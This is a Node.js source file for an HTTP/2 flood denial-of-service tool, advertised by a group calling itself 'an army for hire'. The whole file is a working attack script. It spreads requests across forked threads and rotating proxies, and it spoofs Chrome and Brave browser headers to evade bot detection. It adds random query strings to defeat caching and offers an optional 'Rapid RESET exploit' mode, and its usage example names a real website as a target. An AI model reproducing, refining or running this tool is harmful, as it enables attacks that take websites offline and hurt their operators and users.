/*
    HTTP2 v1.0 flood

    Released by ATLAS API corporation (atlasapi.co)

    t.me/atlasapi for more scripts

    Made by Benshii Varga
*/

process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
   //console.log(er);
});

process.on("SIGHUP", () => {
    return 1;
});
process.on("SIGCHILD", () => {
    return 1;
});

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);

const crypto = require("crypto");
const fs = require('fs');
const url = require('url');
const cluster = require('cluster');
const http2 = require('http2');
const tls = require('tls');
const colors = require('colors');
const net = require('net');

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    defaultCiphers.slice(3)
].join(":");

if (process.argv.length < 7) {
    console.clear();
    console.log(`\n         ${'ATLAS API CORPORATION'.red.bold} ${'|'.bold} ${'an army for hire'.white.bold}`);
    console.log('');
    console.log(colors.cyan("                        t.me/benshii"));
    console.log(`
    ${`${'HTTP2 v1.0 flood'.underline} | Updated header system, custom TLS version, randrate support, optional reset.`.italic}

    ${'Usage:'.bold.underline}

        ${`node HTTP2.js ${'['.red.bold}target${']'.red.bold} ${'['.red.bold}duration${']'.red.bold} ${'['.red.bold}threads${']'.red.bold} ${'['.red.bold}rate${']'.red.bold} ${'['.red.bold}proxy${']'.red.bold} ${'('.red.bold}options${')'.red.bold}`.italic}
        ${'node HTTP2.js https://google.com 300 5 90 proxy.txt --debug true --reset true'.italic}

    ${'Options:'.bold.underline}

        --debug         ${'true'.green}        ${'-'.red.bold}   ${`Debug level response codes`.italic}
        --query         ${'1'.yellow}/${'2'.yellow}         ${'-'.red.bold}   ${'Generate query [1: ?q=wsqd], [2: ?wsqd]'.italic}
        --randrate      ${'true'.green}        ${'-'.red.bold}   ${'Random rate of requests.'.italic}
        --reset         ${'true'.green}        ${'-'.red.bold}   ${'Enable Rapid RESET exploit.'.italic}
        --tls           ${'1'.yellow}/${'2'.yellow}/${'3'.yellow}       ${'-'.red.bold}   ${`TLS max version [1: ${'TLSv1'.underline}], [2: ${'TLSv2'.underline}], [3: ${'TLSv3'.underline}]`.italic}
    `);
    process.exit(0);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]) || 10;
const rate = process.argv[5] || 64;
const proxyfile = process.argv[6] || 'proxies.txt';

function error(msg) {
    console.log(`   ${'['.red}${'error'.bold}${']'.red} ${msg}`);
    process.exit(0);
}

if (!proxyfile) { error("Invalid proxy file!"); }
if (!target || !target.startsWith('https://')) { error("Invalid target address (https only)!"); }
if (!duration || isNaN(duration) || duration <= 0) { error("Invalid duration format!"); }
if (!threads || isNaN(threads) || threads <= 0) { error("Invalid threads format!"); }
if (!rate || isNaN(rate) || rate <= 0) { error("Invalid ratelimit format!"); }

const parsed = url.parse(target);

const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
if (proxies.length <= 0) { error("Proxy file is empty!"); }

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
    { flag: '--debug', value: get_option('--debug') },
    { flag: '--query', value: get_option('--query') },
    { flag: '--randrate', value: get_option('--randrate') },
    { flag: '--reset', value: get_option('--reset') },
    { flag: '--tls', value: get_option('--tls') },
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    } else if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    } else {
        return false;
    }
}

function random_int(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function random_string(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

const random_char = () => {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
};

function generate_headers() {
    const browserVersion = random_int(120, 123);

    const browsers = ['Google Chrome', 'Brave'];
    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    const refererOptions = ["same-site", "same-origin", "cross-site"];
    const referer = refererOptions[Math.floor(Math.random() * refererOptions.length)];

    let brandValue;
    switch (browserVersion) {
        case 120:
            brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${browser}\";v=\"${browserVersion}\"`;
            break;
        case 121:
            brandValue = `\"Not A(Brand\";v=\"99\", \"${browser}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
            break;
        case 122:
            brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${browser}\";v=\"${browserVersion}\"`;
            break;
        case 123:
            brandValue = `\"${browser}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
            break;
    }

    const isBrave = browser === 'Brave';

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

    const secGpcValue = isBrave ? "1" : undefined;

    const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
    const secChUa = `${brandValue}`;
    const refererValue = 'https://' + random_string(6, 6) + ".net";
    const headers = Object.entries({
        ":method": "GET",
        ":authority": parsed.hostname,
        ":scheme": "https",
        ":path": enabled('query')
            ? `${parsed.path}?=${random_string(6, 7)}`
            : parsed.path,
    }).concat(Object.entries({
        ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
        ...("POST" && { "content-length": "0" }),
        "sec-ch-ua": secChUa,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": `\"Windows\"`,
        "upgrade-insecure-requests": "1",
        "user-agent": userAgent,
        "accept": acceptHeaderValue,
        "sec-fetch-site": referer,
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "accept-language": "en-US,en;q=0.9",
        ...(secGpcValue && { "sec-gpc": secGpcValue }),
    }));

    if (Math.random() < 0.4) {
        headers.push(["referer", refererValue]);
    }

    return headers;
}

if (cluster.isMaster) {
    console.log(`\n   ${'->'.cyan} Target ${parsed.host}.`);
    console.log(`   ${'->'.cyan} Starting attack with ${threads} threads for ${duration} seconds.\n\n`);

    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(1);
    }, duration * 1000);
} else {
    function flood() {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        const [ip, port, auth] = proxy.split(':');

        const client = http2.connect(target, {
            createConnection: () => tls.connect({
                host: ip,
                port: port,
                ciphers: ciphers,
                servername: parsed.host,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2'],
                timeout: 5000,
            })
        });

        client.on('error', () => {
            client.close();
            return;
        });

        const amount = enabled('randrate') ? random_int(64, 90) : rate;
        for (let j = 0; j < amount; j++) {
            const headers = generate_headers();
            const req = client.request(headers);
            req.end();
            req.on('response', (res) => {
                if (enabled('debug')) {
                    console.log(`[Debug] ${res[':status']}`);
                }
                req.close();
            });

            req.on('error', () => {
                req.close();
            });

            if (enabled('reset')) {
                setTimeout(() => {
                    client.close();
                }, 5000);
            }
        }
    }

    setInterval(flood, 1000);
}